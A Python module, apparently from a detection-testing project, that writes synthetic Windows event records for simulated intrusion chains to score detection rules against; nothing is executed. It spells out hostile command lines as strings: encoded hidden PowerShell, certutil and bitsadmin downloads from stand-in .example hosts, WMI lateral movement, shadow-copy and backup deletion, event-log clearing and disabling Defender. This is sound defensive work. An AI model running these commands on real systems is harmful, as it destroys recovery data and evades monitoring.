"""The simulated attack chains, built only from text records.

Nothing here runs anything. Each function writes the events that Sysmon and
the Security log *would* record if the attack happened, and labels every one
of them with meta = {"label": "malicious", "chain": ..., "stage": ...,
"techniques": [...]}. That label is the ground truth phase 5 scores against;
the detection rules never read it.

Seen chains (1 to 4) are the ones the rules were designed around. Unseen
variants (1u, 2u, 3u) change a tool or a step, to test whether the rules
generalise or were just fitted to our own generator.
"""

from __future__ import annotations

from datetime import datetime

from .catalog import C2_NETWORK_A, C2_NETWORK_B, DOMAIN, STAGE2_B64, SYSTEM_USER, binary, qualified
from .rand import Rand
from .world import Host, Meta, Proc, World

UPPER_ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


class Label:
    """Makes the meta dict for one chain instance: label("execution", "T1059.001")."""

    def __init__(self, chain: str, instance: str, variant: str = "seen") -> None:
        self.chain, self.instance, self.variant = chain, instance, variant

    def __call__(self, stage: str, *techniques: str) -> Meta:
        return {
            "label": "malicious",
            "chain": self.chain,
            "instance": self.instance,
            "variant": self.variant,
            "stage": stage,
            "techniques": list(techniques),
        }


def _beacon(w: World, r: Rand, proc: Proc, t: datetime, ip: str, label: Label, domain: str = "") -> datetime:
    """An implant checking in with its server about once a minute."""
    for _ in range(r.int_between(3, 6)):
        t += r.seconds(55, 65)
        w.connect(proc, t, ip, 443, label("command-and-control", "T1071.001"), dest_name=domain)
    return t


def chain1_office_macro(
    w: World, r: Rand, victim: Host, t: datetime, label: Label, *, c2: tuple[str, str], unseen: bool = False
) -> Proc:
    """Phishing attachment -> Office -> hidden encoded PowerShell -> C2, payload, persistence.

    Seen: Word starts PowerShell directly (or through cmd.exe), persistence is a Run key.
    Unseen: Excel -> cmd.exe -> PowerShell with short flags, persistence is a scheduled task.
    """
    user = victim.user or "user"
    outlook = victim.procs["outlook"]
    app = "EXCEL.EXE" if unseen else "WINWORD.EXE"
    doc = r.choice(["Payment_Schedule.xlsm", "Bonus_2027.xlsm"] if unseen else
                   ["Invoice_Q3.docm", "Payment_Advice.docm", "Updated_Contract.docm"])
    folder = r.word(8, UPPER_ALNUM)
    path = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\{folder}\\{doc}"
    w.create_file(outlook, t, path, label("delivery", "T1566.001"))

    t += r.seconds(20, 180)  # the user reads the mail, then opens the attachment
    office = w.spawn(outlook, app, f'"{binary(app)[0]}" /n "{path}" /o ""', t, label("user-execution", "T1204.002"))

    t += r.seconds(2, 6)  # the macro runs a few seconds after the document opens
    if unseen:
        ps_command = f"powershell -nop -w 1 -e {STAGE2_B64}"
    else:
        ps_command = f"powershell.exe -nop -w hidden -enc {STAGE2_B64}"
    parent = office
    if unseen or r.chance(0.5):
        parent = w.spawn(office, "cmd.exe", f'cmd.exe /c "{ps_command}"', t, label("execution", "T1059.003"))
        t += r.seconds(0.05, 0.3)
    ps = w.spawn(parent, "powershell.exe", ps_command, t,
                 label("execution", "T1059.001", "T1027.010", "T1564.003"))

    domain, ip = c2
    t += r.seconds(0.3, 1.2)
    w.dns(ps, t, domain, ip, label("command-and-control", "T1071.001"))
    t += r.seconds(0.05, 0.3)
    w.connect(ps, t, ip, 443, label("command-and-control", "T1071.001"), dest_name=domain)

    t += r.seconds(1, 4)
    script = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\{r.choice(['upd', 'svc', 'sync', 'cache'])}{r.int_between(10, 99)}.ps1"
    w.create_file(ps, t, script, label("ingress-tool-transfer", "T1105"))

    t += r.seconds(0.3, 2)
    name = r.choice(["OneDriveUpdate", "EdgeUpdateTask", "TeamsHelper"])
    run = f"powershell.exe -nop -w hidden -File {script}"
    if unseen:
        w.spawn(ps, "schtasks.exe", f'schtasks.exe /create /sc onlogon /tn "{name}" /tr "{run}" /f', t,
                label("persistence", "T1053.005"))
    else:
        w.set_registry(ps, t, w.run_key(user, name), run, label("persistence", "T1547.001"))

    _beacon(w, r, ps, t, ip, label, domain)
    return ps


def chain2_script_certutil(
    w: World, r: Rand, victim: Host, t: datetime, label: Label, *, unseen: bool = False
) -> None:
    """Downloaded .js -> certutil download -> certutil decode -> rundll32 runs the DLL -> C2.

    Unseen: bitsadmin downloads instead of certutil, and regsvr32 runs the DLL.
    """
    user = victim.user or "user"
    payload_ip = C2_NETWORK_B + str(r.int_between(10, 120))
    site = (r.choice(["docs-share.example", "invoice-portal.example", "file-drop.example"]), payload_ip)

    edge = victim.procs.get("edge")
    if edge is None:  # the browser itself is the user's, not the attacker's
        edge = w.spawn(victim.procs["explorer"], "msedge.exe", f'"{binary("msedge.exe")[0]}"', t,
                       {"label": "benign", "activity": "web-browsing"})
        victim.procs["edge"] = edge
    # Drawn whether or not Edge was already open, so the attack's timing never
    # depends on the background noise.
    t += r.seconds(1, 3)
    t = w.lookup_and_connect(edge, t, site, 443, label("delivery", "T1566.002"))
    script = f"C:\\Users\\{user}\\Downloads\\{r.choice(['invoice', 'statement', 'receipt', 'shipping_label'])}_{r.int_between(1000, 9999)}.js"
    t += r.seconds(0.5, 3)
    w.create_file(edge, t, script, label("delivery", "T1566.002"))

    t += r.seconds(10, 120)  # the user double-clicks the download
    ws = w.spawn(victim.procs["explorer"], "wscript.exe", f'"C:\\Windows\\System32\\WScript.exe" "{script}"', t,
                 label("execution", "T1059.007", "T1204.002"))

    stem = r.word(6)
    encoded = f"C:\\Users\\Public\\{stem}.txt"
    dll = f"C:\\Users\\Public\\{stem}.dll"
    url = f"http://{payload_ip}/{stem}.txt"
    t += r.seconds(1, 3)
    if unseen:
        w.spawn(ws, "bitsadmin.exe", f"bitsadmin.exe /transfer {r.word(5)} /download /priority foreground {url} {encoded}",
                t, label("ingress-tool-transfer", "T1197", "T1105"))
        downloader = victim.procs["svc_bits"]  # the BITS *service* does the download, not bitsadmin
    else:
        downloader = w.spawn(ws, "certutil.exe", f"certutil.exe -urlcache -split -f {url} {encoded}", t,
                             label("ingress-tool-transfer", "T1105"))
    t += r.seconds(0.1, 0.6)
    w.connect(downloader, t, payload_ip, 80, label("ingress-tool-transfer", "T1105"))
    t += r.seconds(0.5, 2)
    w.create_file(downloader, t, encoded, label("ingress-tool-transfer", "T1105"))

    t += r.seconds(2, 5)
    decoder = w.spawn(ws, "certutil.exe", f"certutil.exe -decode {encoded} {dll}", t, label("deobfuscation", "T1140"))
    t += r.seconds(0.2, 1)
    w.create_file(decoder, t, dll, label("deobfuscation", "T1140"))

    t += r.seconds(1, 3)
    if unseen:
        runner = w.spawn(ws, "regsvr32.exe", f"regsvr32.exe /s {dll}", t, label("proxy-execution", "T1218.010"))
    else:
        runner = w.spawn(ws, "rundll32.exe", f"rundll32.exe {dll},Start", t, label("proxy-execution", "T1218.011"))
    t += r.seconds(1, 2.5)
    w.connect(runner, t, payload_ip, 443, label("command-and-control", "T1071.001"))
    _beacon(w, r, runner, t, payload_ip, label)


def chain3_wmi_lateral(
    w: World, r: Rand, source: Host, target: Host, t: datetime, label: Label, *,
    launcher: Proc, account: str, c2: tuple[str, str],
) -> None:
    """From a compromised workstation, remote WMI starts PowerShell on a server; it runs discovery.

    The attacker already has the password of admin account `account` (an
    earlier step we don't simulate) and uses it over the network, like
    `runas /netonly`. So the workstation's process runs as the workstation's
    user, but the server sees a network logon (4624 type 3) by `account`.
    """
    inner = f"powershell.exe -nop -w hidden -enc {STAGE2_B64}"
    command = (f'powershell.exe -nop -c "Invoke-CimMethod -ComputerName {target.short} -ClassName Win32_Process '
               f"-MethodName Create -Arguments @{{CommandLine='{inner}'}}\"")
    lm = w.spawn(launcher, "powershell.exe", command, t, label("lateral-movement", "T1047", "T1059.001"))
    t += r.seconds(0.3, 1.0)
    w.connect(lm, t, target.ip, 5985, label("lateral-movement", "T1047"), dest_name=target.name)

    t += r.seconds(0.05, 0.2)
    w.logon(target, t, account, 3, label("lateral-movement", "T1078.002"), source_ip=source.ip)
    w.accept(target.procs["system"], t + r.seconds(0.001, 0.02), source.ip, 5985, label("lateral-movement", "T1047"))

    t += r.seconds(0.3, 1.0)  # WMI's provider host starts the command: WmiPrvSE.exe -> powershell.exe
    remote = w.spawn(target.procs["wmiprvse"], "powershell.exe", inner, t,
                     label("execution", "T1047", "T1059.001", "T1027.010", "T1564.003"),
                     user=qualified(account), cwd="C:\\Windows\\system32\\")
    domain, ip = c2
    t += r.seconds(0.5, 2)
    w.dns(remote, t, domain, ip, label("command-and-control", "T1071.001"))
    w.connect(remote, t + r.seconds(0.05, 0.3), ip, 443, label("command-and-control", "T1071.001"), dest_name=domain)

    for step in r.shuffled(["whoami", "net", "nltest"]):
        t += r.seconds(5, 30)
        if step == "whoami":
            w.spawn(remote, "whoami.exe", '"C:\\Windows\\system32\\whoami.exe" /all', t, label("discovery", "T1033"))
        elif step == "net":
            net = w.spawn(remote, "net.exe", '"C:\\Windows\\system32\\net.exe" group "Domain Admins" /domain', t,
                          label("discovery", "T1069.002"))
            w.spawn(net, "net1.exe", 'C:\\Windows\\system32\\net1  group "Domain Admins" /domain',
                    t + r.seconds(0.01, 0.05), label("discovery", "T1069.002"))
        else:
            w.spawn(remote, "nltest.exe", f'"C:\\Windows\\system32\\nltest.exe" /dclist:{DOMAIN}', t,
                    label("discovery", "T1018"))


def chain3u_remote_task(
    w: World, r: Rand, source: Host, target: Host, t: datetime, label: Label, *, launcher: Proc, account: str
) -> None:
    """Unseen variant of chain 3: a remote *scheduled task* instead of WMI runs the discovery."""
    task = r.choice(["WinUpdateCheck", "EdgeTelemetry", "DiskCleanupTask"])
    log = f"C:\\Windows\\Temp\\{task}.log"
    create = w.spawn(launcher, "schtasks.exe",
                     f'schtasks.exe /create /s {target.short} /ru SYSTEM /tn {task} '
                     f'/tr "cmd.exe /c whoami /all > {log}" /sc once /st 23:59 /f', t,
                     label("lateral-movement", "T1053.005"))
    w.connect(create, t + r.seconds(0.1, 0.4), target.ip, 135, label("lateral-movement", "T1053.005"),
              dest_name=target.name)
    w.logon(target, t + r.seconds(0.2, 0.6), account, 3, label("lateral-movement", "T1078.002"), source_ip=source.ip)
    t += r.seconds(2, 6)
    run = w.spawn(launcher, "schtasks.exe", f"schtasks.exe /run /s {target.short} /tn {task}", t,
                  label("lateral-movement", "T1053.005"))
    w.connect(run, t + r.seconds(0.1, 0.4), target.ip, 135, label("lateral-movement", "T1053.005"),
              dest_name=target.name)
    t += r.seconds(0.5, 2)
    cmd = w.spawn(target.procs["svc_netsvcs"], "cmd.exe", f"cmd.exe /c whoami /all > {log}", t,
                  label("execution", "T1053.005", "T1059.003"), user=SYSTEM_USER, cwd="C:\\Windows\\system32\\")
    w.spawn(cmd, "whoami.exe", "whoami  /all", t + r.seconds(0.02, 0.1), label("discovery", "T1033"))
    w.create_file(cmd, t + r.seconds(0.1, 0.3), log, label("discovery", "T1033"))


def chain4_ransomware_prep(
    w: World, r: Rand, source: Host, target: Host, t: datetime, label: Label, *, account: str, launcher: Proc
) -> None:
    """An RDP session with a stolen admin account deletes backups, clears logs and turns off Defender.

    The order of these steps varies run to run: attackers don't follow a
    script. That is why phase 4 catches this chain by *risk* (many severe
    behaviours on one host in a short time) instead of by an ordered sequence.
    No encryption is simulated: the chain stops at the preparation steps.
    """
    rdp = w.spawn(launcher, "mstsc.exe", f"mstsc.exe /v:{target.short}", t - r.seconds(6, 15),
                  label("lateral-movement", "T1021.001"))
    w.connect(rdp, t - r.seconds(0.5, 2), target.ip, 3389, label("lateral-movement", "T1021.001"),
              dest_name=target.name)
    w.logon(target, t, account, 10, label("lateral-movement", "T1021.001", "T1078.002"), source_ip=source.ip,
            workstation=source.short)
    t += r.seconds(3, 8)
    userinit = w.spawn(target.procs["winlogon"], "userinit.exe", "C:\\Windows\\system32\\userinit.exe", t,
                       label("lateral-movement", "T1021.001"), user=qualified(account))
    t += r.seconds(0.2, 1)
    explorer = w.spawn(userinit, "explorer.exe", "C:\\Windows\\Explorer.EXE", t, label("lateral-movement", "T1021.001"))
    t += r.seconds(30, 90)
    cmd = w.spawn(explorer, "cmd.exe", '"C:\\Windows\\system32\\cmd.exe" ', t, label("execution", "T1059.003"))

    for step in r.shuffled(["vssadmin", "wbadmin", "bcdedit", "clear-system", "clear-security", "defender"]):
        t += r.seconds(4, 25)
        if step == "vssadmin":
            w.spawn(cmd, "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", t, label("impact", "T1490"))
        elif step == "wbadmin":
            w.spawn(cmd, "wbadmin.exe", "wbadmin.exe delete catalog -quiet", t, label("impact", "T1490"))
        elif step == "bcdedit":
            w.spawn(cmd, "bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled No", t, label("impact", "T1490"))
        elif step == "clear-system":
            w.spawn(cmd, "wevtutil.exe", "wevtutil.exe cl System", t, label("defense-impairment", "T1685.005"))
        elif step == "clear-security":
            w.spawn(cmd, "wevtutil.exe", "wevtutil.exe cl Security", t, label("defense-impairment", "T1685.005"))
            w.log_cleared(target, t + r.seconds(0.05, 0.3), account, label("defense-impairment", "T1685.005"))
        else:
            w.spawn(cmd, "powershell.exe",
                    'powershell.exe -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', t,
                    label("defense-impairment", "T1685"))


def c2_server(r: Rand) -> tuple[str, str]:
    return r.choice(["cdn.update-check.example", "static.files-cdn.example", "telemetry.app-metrics.example"]), (
        C2_NETWORK_A + str(r.int_between(10, 250))
    )
